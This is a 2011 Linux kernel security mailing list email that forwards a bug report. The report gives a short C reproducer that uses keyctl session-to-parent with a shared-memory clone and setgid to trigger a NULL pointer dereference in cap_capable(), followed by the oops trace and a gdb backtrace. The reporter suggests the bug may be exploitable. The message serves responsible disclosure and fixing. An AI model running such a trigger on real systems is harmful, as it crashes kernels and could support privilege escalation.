Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S933091Ab1EYI2l (ORCPT <rfc822;w@1wt.eu>);
	Wed, 25 May 2011 04:28:41 -0400
Received: from mail-wy0-f174.google.com ([74.125.82.174]:50265 "EHLO
	mail-wy0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S933022Ab1EYI2h convert rfc822-to-8bit (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Wed, 25 May 2011 04:28:37 -0400
MIME-Version: 1.0
In-Reply-To: <BANLkTin1zhuA3z61cBWwJws+P1-xA5bGZA@mail.gmail.com>
References: <BANLkTikfqV57AtCckh99jAT2O38mM6MzTA@mail.gmail.com>
	<BANLkTikey3L4doiHY=__=690TZNsXqRHUQ@mail.gmail.com>
	<alpine.DEB.2.00.1105231133580.29047@router.home>
	<BANLkTi=-xRRxi4CtxMLt0VgTJWSdiVQugw@mail.gmail.com>
	<BANLkTin1zhuA3z61cBWwJws+P1-xA5bGZA@mail.gmail.com>
Date: Wed, 25 May 2011 09:28:34 +0100
Message-ID: <BANLkTikp4VweUE+JrkXRSJ-8kEEcPKpw8g@mail.gmail.com>
Subject: Re: [Security] Fwd: Oops (bad memory deref) in slab_alloc() due to
 filp_cachep holding incorrect values
From: Eugene Teo <eugeneteo@kernel.sg>
To: =?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?= <robert@swiecki.net>
Cc: linux-kernel@vger.kernel.org, security@kernel.org, kees@ubuntu.com,
        Tavis Ormandy <taviso@cmpxchg8b.com>,
        David Howells <dhowells@redhat.com>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8BIT
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Cc'ed David as well.

On Tue, May 24, 2011 at 8:52 PM, Robert Święcki <robert@swiecki.net> wrote:
> And the repro - I think this might be exploitable (user-space NULL ptr
> deref at the first glance, in cap_capable() while in sys_setgid()).
> Works for me with 2.6.39 and the following config:
> http://alt.swiecki.net/linux_kernel/ise-test-2.6.39-kernel-config.txt
>
> It works for me with apparmor loaded, but looking at the code it
> should work with SELinux as well (both call cap_capable()). Could be
> some regression of http://securitytracker.com/id?1024384
>
> It works with 2.6.39 but not with 2.6.39-rc4. Found with Tavis
> Ormandy's http://code.google.com/p/iknowthis/
>
> #include <sys/stat.h>
> #include <sys/wait.h>
> #include <unistd.h>
> #include <sys/syscall.h>
> #include <linux/keyctl.h>
> #include <linux/sched.h>
>
> int TH1(void *dummy) {
>        syscall(__NR_keyctl, KEYCTL_SESSION_TO_PARENT);
>        syscall(__NR_exit, 0);
> }
>
> int main(int argc, char **argv)
> {
>        char stack[1024 * 32];
>        pid_t pid = clone(TH1, stack + sizeof(stack), CLONE_VM, NULL);
>        if (pid == -1) {
>                perror("clone");
>                return -1;
>        }
>        int status;
>        while(waitpid(pid, &status, __WALL) != pid);
>        setgid(4286409707);
>        return 0;
> }
>
> Oops (stacktraces from the previous emails are also valid). Basically
> 'struct user_namespace *targ_ns' in cap_capable() is NULL.
>
> [  288.431402] CPU 0
> [  288.431402] Pid: 875, comm: apparmor Not tainted 2.6.39 #1 Dell
> Inc.                 Precision WorkStation 390    /0GH911
> [  288.431402] RIP: 0010:[<ffffffff8134cbdf>]  [<ffffffff8134cbdf>]
> cap_capable+0x18/0x67
> [  288.431402] RSP: 0018:ffff880120d43ec8  EFLAGS: 00010203
> [  288.431402] RAX: ffff8801220ee0c0 RBX: 0000000000000001 RCX: 0000000000000006
> [  288.431402] RDX: 0000000000000000 RSI: ffff880120ebb600 RDI: 0000000000000006
> [  288.431402] RBP: ffff880120d43ec8 R08: 0000000000000001 R09: 000000000000005a
> [  288.431402] R10: ffffffff813d42ea R11: 0000000000000246 R12: ffff880120ebb600
> [  288.431402] R13: 0000000000000006 R14: ffff8801205aaee0 R15: 0000000000000000
> [  288.431402] FS:  00007f919efc2720(0000) GS:ffff88012bc00000(0000)
> knlGS:0000000000000000
> [  288.431402] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
> [  288.431402] CR2: 0000000000000408 CR3: 00000001205de000 CR4: 00000000000006f0
> [  288.431402] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
> [  288.431402] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
> [  288.431402] Process apparmor (pid: 875, threadinfo
> ffff880120d42000, task ffff8801205aaee0)
> [  288.431402] Stack:
> [  288.431402]  ffff880120d43f08 ffffffff81378bfb ffff880120d43ee8
> ffff8801205aaee0
> [  288.431402]  00000000ff7d6beb ffff880120ebb600 0000000000000000
> 0000000000000000
> [  288.431402]  ffff880120d43f18 ffffffff8134d932 ffff880120d43f38
> ffffffff8109d99d
> [  288.431402] Call Trace:
> [  288.431402]  [<ffffffff81378bfb>] apparmor_capable+0x27/0x61
> [  288.431402]  [<ffffffff8134d932>] security_capable+0x2a/0x2c
> [  288.431402]  [<ffffffff8109d99d>] ns_capable+0x3a/0x4f
> [  288.431402]  [<ffffffff8109da2b>] nsown_capable+0x24/0x29
> [  288.431402]  [<ffffffff810a6695>] sys_setgid+0x43/0x8d
> [  288.431402]  [<ffffffff81ed4902>] system_call_fastpath+0x16/0x1b
> [  288.431402] Code: c1 fe 05 d3 e0 48 63 f6 23 44 b2 38 c9 83 f8 01
> 19 c0 c3 55 48 89 e5 0f 1f 44 00 00 89 cf 48 81 fa f0 16 a2 82 74 0d
> 48 8b 46 70
> [  288.431402]  39 82 08 04 00 00 74 3d 48 8b 46 70 48 3b 50 60 75 1d 89 f9
> [  288.431402] RIP  [<ffffffff8134cbdf>] cap_capable+0x18/0x67
> [  288.431402]  RSP <ffff880120d43ec8>
> [  288.431402] CR2: 0000000000000408
>
> (gdb) bt
> #0  0xffffffff8134cbdf in cap_capable (tsk=<value optimized out>,
> cred=0x0, targ_ns=0x0, cap=6, audit=1) at security/commoncap.c:88
> #1  0xffffffff81378bfb in apparmor_capable (task=0xffff880120e3aee0,
> cred=0xffff88011f540500, ns=<value optimized out>, cap=6, audit=1) at
> security/apparmor/lsm.c:144
> #2  0xffffffff8134d932 in security_capable (ns=<value optimized out>,
> cred=<value optimized out>, cap=<value optimized out>) at
> security/security.c:160
> #3  0xffffffff8109d99d in ns_capable (ns=<value optimized out>,
> cap=<value optimized out>) at kernel/capability.c:381
> #4  0xffffffff8109da2b in nsown_capable (cap=<value optimized out>) at
> kernel/capability.c:412
> #5  0xffffffff810a6695 in sys_setgid (gid=1540) at kernel/sys.c:570
> #6  0xffffffff810c1e11 in sys_setgid16 (gid=<value optimized out>) at
> kernel/uid16.c:53
>
> --
> Robert Święcki
>
> _______________________________________________
> Security mailing list
> Security@linux.kernel.org
> http://linux.kernel.org/mailman/listinfo/security
>
